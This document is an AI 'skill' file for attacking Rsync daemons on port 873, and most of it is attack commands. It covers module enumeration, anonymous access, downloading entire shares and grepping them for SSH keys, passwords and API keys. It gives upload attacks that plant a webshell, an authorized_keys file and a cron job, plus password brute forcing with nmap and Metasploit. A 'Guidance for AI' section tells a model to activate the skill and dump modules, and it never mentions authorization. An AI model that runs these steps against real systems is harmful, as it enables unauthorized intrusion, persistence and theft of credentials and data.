# Rsync Pentesting Skill

## Goal

Exploit Rsync services to access and exfiltrate files from remote systems.

## Methodology

1. **Discovery**: Identify Rsync services
2. **Module Enumeration**: List available shares/modules
3. **Anonymous Access**: Check for unauthenticated access
4. **File Extraction**: Download files from accessible modules
5. **Upload Attacks**: Upload malicious files if write access allowed

## Port

- 873/TCP: Rsync

## Tools

* **rsync**: Rsync client
* **nmap**: Rsync scripts
* **Metasploit**: Rsync modules

## Example Commands

```bash
# Nmap detection
nmap -p873 --script rsync-* target
nmap -p873 --script rsync-list-modules target
nmap -p873 --script rsync-brute target

# List available modules
rsync --list-only target::

# Try anonymous access
rsync --list-only target::module_name

# Check for banner
nc target 873
# Type: #list
```

## Module Enumeration

```bash
# List all available modules
rsync rsync://target/

# Alternative syntax
rsync --list-only target::

# Get detailed listing
rsync -av --list-only target::module_name/
```

## Downloading Files

```bash
# Download entire module
rsync -av rsync://target/module_name ./local_folder/

# Download specific file
rsync -av rsync://target/module_name/path/to/file ./

# Recursive download
rsync -avr rsync://target/module_name/ ./dump/

# With progress
rsync -avP rsync://target/module_name/ ./dump/

# With authentication
rsync -av rsync://user@target/module_name/ ./dump/
# Enter password when prompted

# Or with password file
rsync -av --password-file=pass.txt rsync://user@target/module_name/ ./
```

## Interesting Files to Look For

```bash
# After downloading, search for:

# SSH keys
find ./dump -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys"

# Configuration files
find ./dump -name "*.conf" -o -name "*.cfg" -o -name "*.ini"

# Credentials
grep -r "password" ./dump
grep -r "credential" ./dump
grep -r "api_key" ./dump

# Database files
find ./dump -name "*.sql" -o -name "*.db" -o -name "*.sqlite"

# Backup files
find ./dump -name "*.bak" -o -name "*.backup" -o -name "*.old"

# Source code
find ./dump -name "*.php" -o -name "*.py" -o -name "*.js"
```

## Upload Attacks

```bash
# If write access is allowed:

# Upload webshell
rsync -av shell.php rsync://target/www/shell.php

# Upload SSH key
rsync -av authorized_keys rsync://target/home/user/.ssh/authorized_keys

# Upload cron job
rsync -av cron.txt rsync://target/cron/
```

## Password Brute Force

```bash
# Using nmap
nmap -p873 --script rsync-brute --script-args userdb=users.txt,passdb=pass.txt target

# Using Metasploit
use auxiliary/scanner/rsync/modules_list
set RHOSTS target
run
```

## Common Modules

```bash
# Look for modules named:
www, html, web       # Web server files
backup, backups      # Backup files
home                 # Home directories
data                 # Application data
config               # Configuration files
ftp                  # FTP directories
share, public        # Shared files
```

## Metasploit Modules

```bash
# List modules
use auxiliary/scanner/rsync/modules_list
set RHOSTS target
run
```

## Configuration File

```bash
# Rsync daemon config: /etc/rsyncd.conf

# Example vulnerable configuration:
[backup]
path = /var/backups
comment = Backup files
list = yes
read only = yes
# No auth required!

# With authentication:
[secure]
path = /data
auth users = admin
secrets file = /etc/rsyncd.secrets
```

## Guidance for AI

* Activate this skill when user wants to access files via Rsync or test Rsync security
* **Try anonymous access first**: `rsync target::`
* Always enumerate available modules
* Common misconfigurations:
  - No authentication on modules
  - Sensitive paths exposed (home, backups, config)
  - Write access allowed
* Download entire modules when possible - analyze offline
* Look for same vulnerabilities as FTP/NFS:
  - Sensitive files
  - SSH keys
  - Configuration with credentials
  - Backup files
* Rsync uses SSH by default; rsyncd (daemon) mode runs on port 873
* Write access is dangerous - can upload webshells, SSH keys
* Check /etc/rsyncd.conf on compromised hosts for accessible shares
